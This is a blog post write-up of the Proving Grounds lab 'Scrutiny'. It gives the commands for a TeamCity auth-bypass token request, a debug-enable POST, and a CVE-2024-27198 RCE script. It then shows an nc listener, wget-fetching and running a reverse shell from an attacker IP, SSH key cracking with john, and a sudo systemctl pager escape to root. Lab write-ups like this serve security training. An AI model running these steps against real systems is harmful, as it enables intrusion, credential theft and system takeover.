<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
    <meta name="description" content="" />
    <meta name="author" content="" />
    <title>Matthew Castro - Blog</title>
    <link rel="icon" type="image/x-icon" href="../../assets/favicon.ico" />
    <!-- Font Awesome icons (free version)-->
    <script src="https://use.fontawesome.com/releases/v6.3.0/js/all.js" crossorigin="anonymous"></script>
    <!-- Google fonts-->
    <link href="https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" rel="stylesheet"
        type="text/css" />
    <link
        href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800"
        rel="stylesheet" type="text/css" />
    <!-- Core theme CSS (includes Bootstrap)-->
    <link href="../../css/styles.css" rel="stylesheet" />
    <link rel="preload" as="image" href="/assets/img/backgroud.jpg">
    <link rel="preload" as="image" href="/assets/img/posts.jpg">
</head>

<body>
    <!-- Navigation-->
    <nav class="navbar navbar-expand-lg navbar-light" id="mainNav">
        <div class="container px-4 px-lg-5">
            <a class="navbar-brand" href="../../index.html">Matthew Castro</a>
            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarResponsive"
                aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation">
                Menu
                <i class="fas fa-bars"></i>
            </button>
            <div class="collapse navbar-collapse" id="navbarResponsive">
                <ul class="navbar-nav ms-auto py-4 py-lg-0">
                        <li class="nav-item"><a class="nav-link px-lg-3 py-3 py-lg-4" href="../../index.html">Homelab</a></li>
                        <li class="nav-item"><a class="nav-link px-lg-3 py-3 py-lg-4" href="../../reports.html">Reports</a></li>
                        <li class="nav-item"><a class="nav-link px-lg-3 py-3 py-lg-4" href="../../Write-ups.html">Write-ups</a></li>
                        <li class="nav-item"><a class="nav-link px-lg-3 py-3 py-lg-4" href="../../about.html">About</a></li>
                </ul>
            </div>
        </div>
    </nav>
    <!-- Page Header-->
    <header class="masthead" style="background-image: url('../../assets/img/posts.jpg')">
        <div class="container position-relative px-4 px-lg-5">
            <div class="row gx-4 gx-lg-5 justify-content-center">
                <div class="col-md-10 col-lg-8 col-xl-7">
                    <div class="post-heading">
                        <h2>Scrutiny - Proving Grounds Write-up</h2>
                        <span class="meta">
                            Posted on January 17th, 2026
                        </span>
                    </div>
                </div>
            </div>
        </div>
    </header>
    <!-- Post Content-->
    <article class="mb-4">
        <div class="container px-4 px-lg-5">
            <div class="row gx-4 gx-lg-5 justify-content-center">
                <div class="col-md-10 col-lg-8 col-xl-7">
                    <p>We start by identifying the version of the TeamCity service on port 80 as version 2023.05.4. This version has many vulnerability POCs available online.
                    </p>
                        <img class="img-fluid" src="../../assets/img/writeups/scrutiny/1.png" alt="..." />
                        <p></p>
                        I am not sure what the intended route was in this lab for the initial access, but I will detail  the one that I took. 
                        <p></p>
                        First, we enable debugging on the server. 
                        <p></p>
                        <span class="grey-line">curl -s -X POST 'http://teams.onlyrands.com/any?jsp=/app/rest/users/id:1/tokens/new-token;.jsp' | xml_pp</span>
                        <p></p>
                        <img class="img-fluid" src="../../assets/img/writeups/scrutiny/2.png" alt="..." />
                        <p></p>
                        <span class="grey-line">TOKEN=token_value</span>
                        <p></p>
                        <span class="grey-line">curl -X POST 'http://teams.onlyrands.com/admin/dataDir.html?action=edit&fileName=config%2Finternal.properties&content=rest.debug.processes.enable=true' -H "Authorization: Bearer $TOKEN"</span>
                        <p></p>
                        <img class="img-fluid" src="../../assets/img/writeups/scrutiny/3.png" alt="..." />
                    <p>
                    We then use this POC: <a href="https://github.com/W01fh4cker/CVE-2024-27198-RCE/tree/main" target="_blank">https://github.com/W01fh4cker/CVE-2024-27198-RCE/tree/main</a> and obtain RCE. 
                    </p>
                    <span class="grey-line">python3 CVE-2024-27198-RCE.py -t http://teams.onlyrands.com</span>
                    <p></p>
                    <img class="img-fluid" src="../../assets/img/writeups/scrutiny/4.png" alt="..." />
                    <p></p>
                    We start a listener, transfer a bash reverse shell and execute it using our RCE to obtain a reverse shell connection.
                    <p></p>
                    <span class="grey-line">rlwrap nc -lvnp 80</span>
                    <p></p>
                    <img class="img-fluid" src="../../assets/img/writeups/scrutiny/5.png" alt="..." />
                    <p></p>
                    <span class="grey-line">wget http://192.168.45.239/shell</span>
                    <p></p>
                    <span class="grey-line">chmod +x shell</span>
                    <p></p>
                    <span class="grey-line">./shell</span>
                    <p></p>
                    <img class="img-fluid" src="../../assets/img/writeups/scrutiny/6.png" alt="..." />
                    <p></p>
                    We then enumerate the files in the Git user's home directory using our reverse shell. 
                    We find Git repositories for the four users who are part of the freelance group on the machine. 
                    After enumerating the Git logs, we notice that the SSH key of user marcot was mistakenly pushed 
                    and then removed. We save it locally and crack its password. We can now use the password of the 
                    SSH key as the password for user marcot and login via SSH.
                    <p></p>
                    <span class="grey-line">git log</span>
                    <p></p>
                    <img class="img-fluid" src="../../assets/img/writeups/scrutiny/7.png" alt="..." />
                    <p></p>
                    <span class="grey-line">git show 856f7c45f504b8f37593a2fff99c59e00a601e6e</span>
                    <p></p>
                    <img class="img-fluid" src="../../assets/img/writeups/scrutiny/8.png" alt="..." />
                    <p></p>
                    <span class="grey-line">ssh2john key > test</span>
                    <p></p>
                    <span class="grey-line">john test --wordlist=/usr/share/wordlists/rockyou.txt</span>
                    <p></p>
                    <span class="grey-line">john test --show</span>
                    <p></p>
                    <img class="img-fluid" src="../../assets/img/writeups/scrutiny/9.png" alt="..." />
                    <p></p>
                    <span class="grey-line">ssh marcot@192.168.229.91</span>
                    <p></p>
                    <img class="img-fluid" src="../../assets/img/writeups/scrutiny/10.png" alt="..." />
                    <p></p>
                    We then read his emails found in the /var/mail directory and find the password for user matthewa. 
                    <p></p>
                    <span class="grey-line">cd /var/mail</span>
                    <p></p>
                    <span class="grey-line">cat marcot</span>
                    <p></p>                    <p></p>
                    <img class="img-fluid" src="../../assets/img/writeups/scrutiny/11.png" alt="..." />
                    <p></p>
                    We switch to user matthewa using su. We find credentials for user briand in a file in the home directory.
                    <p></p>
                    <span class="grey-line">su matthewa</span>
                    <p></p>
                    <span class="grey-line">cat .~</span>
                    <p></p>
                    <img class="img-fluid" src="../../assets/img/writeups/scrutiny/12.png" alt="..." />
                    <p></p>
                    Again, we switch users using su. We enumerate our sudo permissions and find we can check the TeamCity server status using systemctl.
                     This is not secure, as we can easily break out of the spawned pager. We do so and obtain a root shell.
                    <p></p>
                    <span class="grey-line">sudo -l</span>
                    <p></p>
                    <span class="grey-line">sudo /usr/bin/systemctl status teamcity-server.service</span>
                    <p></p>
                    <span class="grey-line">!sh</span>
                    <p></p>
                    <img class="img-fluid" src="../../assets/img/writeups/scrutiny/13.png" alt="..." />




                </div>
            </div>
        </div>
    </article>
    <!-- Bootstrap core JS-->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>
    <!-- Core theme JS-->
    <script src="js/scripts.js"></script>
</body>

</html>